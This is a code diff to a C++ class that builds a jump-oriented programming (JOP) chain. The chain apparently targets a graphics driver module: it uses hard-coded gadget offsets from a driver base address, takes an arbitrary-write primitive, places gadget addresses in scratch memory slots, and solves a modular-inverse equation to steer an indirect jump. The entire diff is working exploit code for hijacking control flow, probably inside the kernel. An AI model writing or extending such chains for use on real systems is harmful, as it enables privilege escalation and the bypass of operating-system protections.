@@ -1,7 +1,7 @@
 #include "jopmanager.h"
 
 JOPManager::JOPManager()
-    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0), scratchBase(0), g1Off(0), rax(0), rsi(0), rdx(0)
+    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0), scratchBase(0), g1Off(0), rax(0), rsi(0), rdx(0), rdiForJmp(0)
 {}
 
 void JOPManager::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn) {
@@ -47,11 +47,36 @@ void JOPManager::Build(UINT64 g1Off_, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) 
     UINT64 g3 = nvidiaBase + g3Off;
     UINT64 g4 = nvidiaBase + g4Off;
 
-    // rsi slots:
-    // [rsi+0x66] = g2 (gadget1's jmp after target returns → gadget2 pop rdx)
-    // [rsi-0x39] = g3 (gadget2's jmp after pop rdx → gadget3)
-    AddSlot("rsi_fwd [rsi+0x66]", SCRATCH_RSI_FWD, g2);
-    AddSlot("rsi_bck [rsi-0x39]", SCRATCH_RSI_BCK, g3);
+    UINT64 pop_rcx_rdi = nvidiaBase + 0x000636d07; // pop rcx ; jmp [rdi*9+0xDBB9]  (skip and eax)
+    UINT64 pop_rdi = nvidiaBase + 0x0003fce5;      // pop rdi ; test al,0xFD ; jmp [rsi-0x77]
+    UINT64 pop_rcx = nvidiaBase + 0x000ae8360;     // pop rcx ; jmp [rsi-0x7F]
+    UINT64 pop_rbx = nvidiaBase + 0x000da4fd2;     // pop rbx ; jmp [rsi+0x44]
+
+    // Compute rdi value for [rdi*9+0xDBB9] jump to land in scratch
+    UINT64 target_rdi_jmp = scratchBase + SCRATCH_RDI_JMP;
+    // Solve: rdi * 9 + 0xDBB9 ≡ target (mod 2^64) using modular inverse of 9
+    // Compute 9^(-1) mod 2^64 via Newton-Raphson (5 doublings = 64 bits of precision)
+    UINT64 x = 9;
+    x *= 2 - 9 * x;
+    x *= 2 - 9 * x;
+    x *= 2 - 9 * x;
+    x *= 2 - 9 * x;
+    x *= 2 - 9 * x;
+    // x is now 9^(-1) mod 2^64
+
+    rdiForJmp = (target_rdi_jmp - 0xDBB9) * x;
+    DbgLog("[JOP] rdi=0x%llX → verify [rdi*9+0xDBB9]=0x%llX (expect 0x%llX)\n",
+        rdiForJmp, rdiForJmp * 9 + 0xDBB9, target_rdi_jmp);
+
+    // Chain: pop_rcx_rdi (pop1, uses rdi) → pop_rdi (pop2) → pop_rcx (pop3) → pop_rbx (pop4) → gadget2
+    AddSlot("rsi_fwd  [rsi+0x66]", SCRATCH_RSI_FWD,  pop_rcx_rdi); // entry after function returns
+    AddSlot("rsi_0x44 [rsi+0x44]", SCRATCH_RSI_0x44, g2);          // pop_rbx → gadget2
+    AddSlot("rsi_bck  [rsi-0x39]", SCRATCH_RSI_BCK,  g3);          // gadget2 → gadget3
+    AddSlot("rdi_jmp [rdi*9+0xDBB9]", SCRATCH_RDI_JMP, pop_rdi);   // pop_rcx_rdi chains here
+
+    // Negative-offset slots — use absolute addresses directly (below scratchBase, still .data)
+    slots.push_back({ "rsi_n77 [rsi-0x77]", scratchBase - 0x38, pop_rcx }); // pop_rdi → pop_rcx
+    slots.push_back({ "rsi_n7F [rsi-0x7F]", scratchBase - 0x40, pop_rbx }); // pop_rcx → pop_rbx
     rsi = scratchBase + SCRATCH_RSI_FWD - 0x66;
     DbgLog("[JOP] rsi=0x%llX  [rsi+0x66]=0x%llX  [rsi-0x39]=0x%llX\n",
         rsi, rsi + 0x66, rsi - 0x39);
